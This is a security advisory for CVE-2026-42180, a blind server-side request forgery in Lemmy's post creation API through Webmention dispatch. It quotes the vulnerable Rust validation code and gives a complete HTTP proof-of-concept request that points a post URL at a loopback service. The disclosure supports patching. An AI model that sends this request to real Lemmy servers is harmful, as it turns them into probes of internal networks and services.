# [M] Lemmy has SSRF in /api/v3/post via Webmention dispatch

## Summary
Severity: Medium
Advisory: GHSA-3jvj-v6w2-h948
CVE: CVE-2026-42180
CWE: CWE-918
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-04-24
Source: https://github.com/advisories/GHSA-3jvj-v6w2-h948
Type: github-advisory

## Affected
- crates.io: `lemmy_api_common` — affected >=0 <0.19.18

## Details
### Summary
Lemmy allows an authenticated low-privileged user to create a link post through `POST /api/v3/post`. When a post is created in a public community, the backend asynchronously sends a Webmention to the attacker-controlled link target.

The submitted URL is checked for syntax and scheme, but the audited code path does not reject loopback, private, or link-local destinations before the Webmention request is issued. This lets a normal user trigger server-side HTTP requests toward internal services.

### Details
The entry point is the normal post creation API. The user-controlled `url` field is accepted, normalized with `diesel_url_create()`, and only validated with `is_valid_url()`. That validation allows `http` and `https` but does not implement internal address rejection.

The post creation flow then schedules Webmention delivery for public communities. This creates a direct source-to-sink path from an externally supplied post URL to a server-side outbound HTTP request.

Core vulnerable code path:

```rust
// crates/api_crud/src/post/create.rs
let url = diesel_url_create(data.url.as_deref())?;
if let Some(url) = &url {
  is_url_blocked(url, &url_blocklist)?;
  is_valid_url(url)?;
}
```

```rust
// crates/utils/src/utils/validation.rs
pub fn is_valid_url(url: &Url) -> LemmyResult<()> {
  let is_valid = ["http", "https", "magnet"].contains(&url.scheme());
  if !is_valid {
    Err(LemmyErrorType::InvalidUrl)?
  }
  Ok(())
}
```

```rust
// crates/api_crud/src/post/create.rs
if community.visibility == CommunityVisibility::Public {
  let post = inserted_post.clone();
  let url = url.clone();
  spawn_try_task(async move {
    if let Some(url) = url {
      Webmention::new(post.ap_id.clone().into(), url.into()).send().await?;
    }
    Ok(())
  });
}
```

These snippets matter because they show that the attacker controls `CreatePost.url`, the only validation is scheme-level, and the resulting URL is later used for server-side Webmention delivery.

### PoC
_Complete instructions, including specific configuration details, to reproduce the vulnerability._Prerequisites:

- The attacker has a valid low-privileged account.
- The attacker can post to a public community.

Practical reproduction flow:

1. Run an HTTP listener on an internal or loopback-reachable address from the Lemmy server's perspective, such as `127.0.0.1:8081`.
2. Authenticate as a normal user.
3. Submit a post to a public community with `url` set to the internal target.
4. Observe the Lemmy API return a normal post creation response.
5. Observe the internal HTTP listener receive a request from the Lemmy server shortly afterwards.

Complete PoC:

```http
POST /api/v3/post HTTP/1.1
Host: victim.example
Authorization: Bearer <low-priv-jwt>
Content-Type: application/json

{
  "name": "wm-ssrf",
  "community_id": 1,
  "url": "http://127.0.0.1:8081/",
  "body": null,
  "alt_text": null,
  "honeypot": null,
  "nsfw": false,
  "language_id": null,
  "custom_thumbnail": null
}
```

Outcome:

- The API returns a successful `post_view` response.
- The Lemmy server later issues an outbound request toward `http://127.0.0.1:8081/` as part of Webmention processing.
### Impact
An authenticated user can use the application server as a blind SSRF primitive against internal HTTP services. This can expose internal network reachability, trigger internal webhooks or administrative endpoints, and expand the attack surface beyond the public deployment boundary.

Because the sink is reached after ordinary user content submission, the issue is practical to exploit in real deployments where normal users can post to public communities.

## References
- https://github.com/LemmyNet/lemmy/security/advisories/GHSA-3jvj-v6w2-h948
- https://nvd.nist.gov/vuln/detail/CVE-2026-42180
- https://github.com/LemmyNet/lemmy/commit/1f06693b708020c5c3a3752bd2f1c6006a75e9bc
- https://github.com/LemmyNet/lemmy
- https://github.com/LemmyNet/lemmy/releases/tag/0.19.18
